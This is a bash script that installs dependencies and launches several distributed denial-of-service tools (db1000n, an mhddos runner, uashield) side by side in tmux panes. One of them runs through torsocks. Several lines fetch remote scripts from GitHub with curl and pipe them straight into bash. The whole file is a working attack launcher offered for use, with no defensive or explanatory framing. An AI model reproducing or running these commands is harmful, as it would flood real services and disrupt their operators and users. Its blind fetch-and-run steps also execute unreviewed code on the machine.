#!/bin/bash
sudo apt update -y
sudo apt install -y tmux torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
pip install --upgrade pip

tmux kill-session -t multiddos
sudo pkill node
cd ~
mkdir multiddos
cd multiddos
curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
rm *.tar.gz

tmux new-session -s "multid" -d 'gotop -asc solarized'
tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
#tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
tmux split-window -v 'torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
tmux -2 attach-session -d
